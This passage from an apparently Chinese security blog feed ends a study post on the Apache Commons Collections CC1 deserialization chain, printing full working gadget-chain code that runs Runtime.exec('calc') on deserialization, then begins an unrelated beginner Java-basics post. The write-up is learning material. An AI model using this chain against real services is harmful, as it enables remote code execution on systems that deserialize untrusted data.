class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Z1d10t.dubug;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.crypto.dsig.Transform;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//改为InvokerTransformer调用形式</span></span><br><span class="line"><span class="comment">//        Method rReflectionMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class</span></span><br><span class="line"><span class="comment">//        ,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);//Runtime.class注意这里用法</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,</span></span><br><span class="line"><span class="comment">//                new Object[]&#123;null, null&#125;).transform(rReflectionMethod);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class</span><br><span class="line">                        ,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);//Runtime.class只有这里是我们可控 其他都是套娃 这里需要理解</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Class runtimeReflection = Runtime.class;</span></span><br><span class="line">        <span class="comment">//Method rReflectionMethod = runtimeReflection.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">        <span class="comment">//获得对象</span></span><br><span class="line">        <span class="comment">//Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//静态方法无对象 无参方法</span></span><br><span class="line">        <span class="comment">//再来获取exec方法</span></span><br><span class="line">        <span class="comment">//Method exec = runtimeReflection.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="comment">//exec.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        //Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">////        Class&lt;? extends Runtime&gt; runtiomeClass = r.getClass();</span></span><br><span class="line"><span class="comment">////        Method runtimeMethod = runtiomeClass.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">////        Object invokerObject = runtimeMethod.invoke(r, &quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        //rlInvokerTransformer.transform(r);</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">//先创建一个map对象</span></span><br><span class="line">        map.put(<span class="string">&quot;Z1d10t&quot;</span>,<span class="string">&quot;Z1d10t&quot;</span>);<span class="comment">//任意填</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformdMap =TransformedMap.decorate(map, <span class="literal">null</span>,chainedTransformer );</span><br><span class="line"><span class="comment">////        for(Map.Entry Entry:transformdMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">////            Entry.setValue(r); //注意我们这里都是在传一个对象</span></span><br><span class="line"><span class="comment">////        &#125;</span></span><br><span class="line">        Class&lt;?&gt; annotationClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> annotationClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationConstructor.newInstance(Override.class, transformdMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.ser&quot;</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此还是执行不了 因为执行<code>AnnotationInvocationHandler</code>下的<code>readObject()</code>我们有条件没有满足</p><p>有两个if语句</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695656475842-9c59a2b1-a290-4f18-950f-a4c2b380716f.png" alt="img"></p><p>打两个断点我们调试一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695656614798-185efa8a-81cd-45f1-97e0-1dcb2d11d4d8.png" alt="img"></p><p>发现第一个条件<code>memberType != null</code>是不满足的 就直接出来了</p><p>这里memeberType是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，而我们所使用的注解Override是没有成员变量的 所以得找一个有成员变量的注解</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695656950483-53b96348-5425-422d-a469-e49e1187758f.png" alt="img"></p><p>Target注解 注意这里value()并不是函数 而是它的属性 学注解的时候有注意到这个</p><p>因此要将<code>Object o = annotationConstructor.newInstance(Override.class, transformdMap);</code> </p><p>Override改为Target</p><p>并且把这块的key改为value</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695657243795-18fd1e65-1765-4493-b6e2-d2fe0cbc3ba6.png" alt="img"></p><p>终于进来了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695657219389-97bbbae7-153d-4e31-882a-8b5730df1bec.png" alt="img"></p><h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><p>在setValue的时候，我们传入的value值根本就不是我们需要的Runtime.class</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695657573479-621fe54d-1c93-4702-bde2-f209cdf81b42.png" alt="img"></p><p>那么我们应该怎么把他转回我们想要的值呢</p><p>这里用到了<code>ConstantTransformer</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695657728441-bb8f818a-51f2-4d0e-ab7d-02bedce9c460.png" alt="img"></p><p>这个类里面也有transform，和构造函数配合使用的话</p><p>无论我们传入什么值，就会返回构造函数传的那个值，这样就能将value的值转为<code>Runtime.class</code></p><p>至此所有的链就结束了</p><p>最终代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Z1d10t.dubug;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.crypto.dsig.Transform;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//改为InvokerTransformer调用形式</span></span><br><span class="line"><span class="comment">//        Method rReflectionMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class</span></span><br><span class="line"><span class="comment">//        ,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);//Runtime.class注意这里用法</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,</span></span><br><span class="line"><span class="comment">//                new Object[]&#123;null, null&#125;).transform(rReflectionMethod);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class</span><br><span class="line">                        ,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);//Runtime.class只有这里是我们可控 其他都是套娃 这里需要理解</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeReflection</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Method rReflectionMethod = runtimeReflection.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">        <span class="comment">//获得对象</span></span><br><span class="line">        <span class="comment">//Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//静态方法无对象 无参方法</span></span><br><span class="line">        <span class="comment">//再来获取exec方法</span></span><br><span class="line">        <span class="comment">//Method exec = runtimeReflection.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="comment">//exec.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        //Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">////        Class&lt;? extends Runtime&gt; runtiomeClass = r.getClass();</span></span><br><span class="line"><span class="comment">////        Method runtimeMethod = runtiomeClass.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">////        Object invokerObject = runtimeMethod.invoke(r, &quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        //rlInvokerTransformer.transform(r);</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">//先创建一个map对象</span></span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;Z1d10t&quot;</span>);<span class="comment">//任意填</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformdMap =TransformedMap.decorate(map, <span class="literal">null</span>,chainedTransformer );</span><br><span class="line"><span class="comment">////        for(Map.Entry Entry:transformdMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">////            Entry.setValue(r); //注意我们这里都是在传一个对象</span></span><br><span class="line"><span class="comment">////        &#125;</span></span><br><span class="line">        Class&lt;?&gt; annotationClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> annotationClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationConstructor.newInstance(Target.class, transformdMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.ser&quot;</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="后言："><a href="#后言：" class="headerlink" title="后言："></a>后言：</h1><p>虽然跟着视频资料一步一步跟过来了 但是还是不太熟悉 还是得多调试多想 </p><p>累了 调了几天了 终于结束了</p><h1 id="感谢："><a href="#感谢：" class="headerlink" title="感谢："></a>感谢：</h1><p>组长<a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=67f50016dfc916b4c141ffd179381426">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></p><p>佬文章 <a href="https://xz.aliyun.com/t/12669#toc-3">JAVA安全初探(三):CC1链全分析 - 先知社区</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JAVA基础</title>
      <link href="/post/43d73074.html"/>
      <url>/post/43d73074.html</url>
      
        <content type="html"><![CDATA[<p>JAVA基础</p><span id="more"></span><h1 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h1><p>感觉正式java之旅之前还是要先稍微了解IDEA的基本知识，不然很难进行下去。</p><h2 id="创建项目前置知识"><a href="#创建项目前置知识" class="headerlink" title="创建项目前置知识"></a>创建项目前置知识</h2><p>IDEA中最大的单位应该是project</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694434114278-f9c87cd4-0ea5-4145-a87c-2c81ee693b8a.png" alt="img"></p><p>可以理解为是workspace</p><p>然后是directory、module和package</p><p>package是JAVA类的命名空间 避免类名重复 </p><p>加入我们创建com.Z1d10t 那么就会在本地创建嵌套的文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694440895043-26781dca-312f-4a75-9d22-dd34da27a0c2.png" alt="img"></p><p>这两个层级应该是一样的都是低于project 但是有些差异</p><p>module一般是我们用于构建源代码的文件夹，用于组织项目的不同部分</p><p>而directory是普通文件夹 就比如我们在电脑上普通的文件夹 没有特殊含义</p><p>在项目中常常用来放静态音视频图片之类的</p><p>然后我们就可以右击我们的module开始创建源文件进行创作了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694434659019-af08e6c9-610f-4145-8b84-d9d45b211cb6.png" alt="img"></p><h2 id="project和module的关系"><a href="#project和module的关系" class="headerlink" title="project和module的关系"></a>project和module的关系</h2><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694434594830-8437aba0-237d-4d4d-b31c-1d28272fb8ce.png" alt="img"></p><h2 id="集成JVM"><a href="#集成JVM" class="headerlink" title="集成JVM"></a>集成JVM</h2><p>如果我们不用IDEA进行java开发的话，我们首先是创建<code>.java</code>的源代码，然后通过javac.exe来编译为<code>.class</code>后缀的文件才可以运行</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694435200732-04c8c20d-6fb4-4dfd-94fd-6f4eb6eee33f.png" alt="img"></p><p>但是IDEA直接集成了JAVA虚拟机也就是JVM，直接写完帮我们编译然后运行，非常方便。</p><p>这也就是为什么java有跨平台性，编译一次到处执行</p><p>就是因为JVM的原因，不用去看机器环境，自己就有一个环境，把自己包裹起来的呢种。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694435143768-4ba669ca-eaff-448e-8d14-a79f2535b96a.png" alt="img"></p><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><p>编写 Java 程序时，应注意以下几点：</p><ul><li>大小写敏感：Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。</li><li>类名：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 MyFirstJavaClass，也就是要驼峰式命名。</li><li>方法名：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。</li><li>源文件名：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 .java。（如果文件名和类名不相同则会导致编译错误）。</li><li>主方法入口：所有的 Java 程序由 <code>public static void main(String[] args) </code>方法开始执行。</li></ul><h2 id="JAVA标识符"><a href="#JAVA标识符" class="headerlink" title="JAVA标识符"></a>JAVA标识符</h2><p>通俗说就是名字，类名变量名方法名都被称为标识符</p><ul><li>字母数字美元符号或者下划线开头其他非法</li><li>关键字不能作为标识符 关键字就是一些已经被java占用的名字 有特殊含义的我们不能用</li><li>大小写敏感</li></ul><h2 id="JAVA修饰符"><a href="#JAVA修饰符" class="headerlink" title="JAVA修饰符"></a>JAVA修饰符</h2><ul><li>访问控制修饰符 : default, public , protected, private</li><li>非访问控制修饰符 : final, abstract, static, synchronized</li></ul><p>可以用来修饰类中方法和属性</p><h2 id="JAVA变量"><a href="#JAVA变量" class="headerlink" title="JAVA变量"></a>JAVA变量</h2><ul><li>局部变量</li><li>类变量（静态变量）</li><li>成员变量（非静态变量）</li></ul><h2 id="JAVA数组"><a href="#JAVA数组" class="headerlink" title="JAVA数组"></a>JAVA数组</h2><p>数组是储存在堆上的对象，可以保存多个同类型变量</p><h2 id="JAVA关键字"><a href="#JAVA关键字" class="headerlink" title="JAVA关键字"></a>JAVA关键字</h2><p><a href="https://www.runoob.com/java/java-basic-syntax.html">https://www.runoob.com/java/java-basic-syntax.html</a> 遇到了直接查表就行了</p><h2 id="从HelloWorld开始"><a href="#从HelloWorld开始" class="headerlink" title="从HelloWorld开始"></a>从HelloWorld开始</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694435638507-27066ea6-5788-41d4-9fdd-1b1fc3c35ce9.png" alt="img"></p><p>首先就是要需要梳理一个理念就是在java中一切都是类 </p><p>psvm快捷键可以直接生成 <code>public static void main(String[] args)&#123;&#125;</code></p><p>sout快捷键可以直接生成<code>System.out.println(&quot;hello world&quot;)</code></p><p>首先我们的文件名是什么那么我们的类名也是什么</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694437426240-3a091928-0f53-45b5-9da4-d93640a78d10.png" alt="img"></p><h2 id="public-class-和-class的区别"><a href="#public-class-和-class的区别" class="headerlink" title="public class 和 class的区别"></a>public class 和 class的区别</h2><p>也就是说我们可以创建多个类</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694438066917-b9cb277c-c61e-4f07-85ef-d2e71720c87a.png" alt="img"></p><p>但是公共类只能有一个并且公共类的类名必须与文件名保持一致</p><p>并且任何类中都可以设置程序入口 也就是都可以写main方法</p><p><strong>但是虽然我们可以在一个java源文件中定义多个类，但是这种做法是不规范的，比较规范的是一个源文件只能定义一个class</strong></p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//单行注释</span><br><span class="line">/**/多行注释</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694437533622-d38ce5da-db23-4c92-9786-e71a11b775d5.png" alt="img"></p><h1 id="JAVA对象和类"><a href="#JAVA对象和类" class="headerlink" title="JAVA对象和类"></a>JAVA对象和类</h1><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><p>如果没有显式构造方法 java编译器会为该类提供一个默认构造方法</p><p>一个类构造方法可以有多个</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694439082703-3fafddcb-d009-470a-89ac-6075109b7f02.png" alt="img"></p><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span 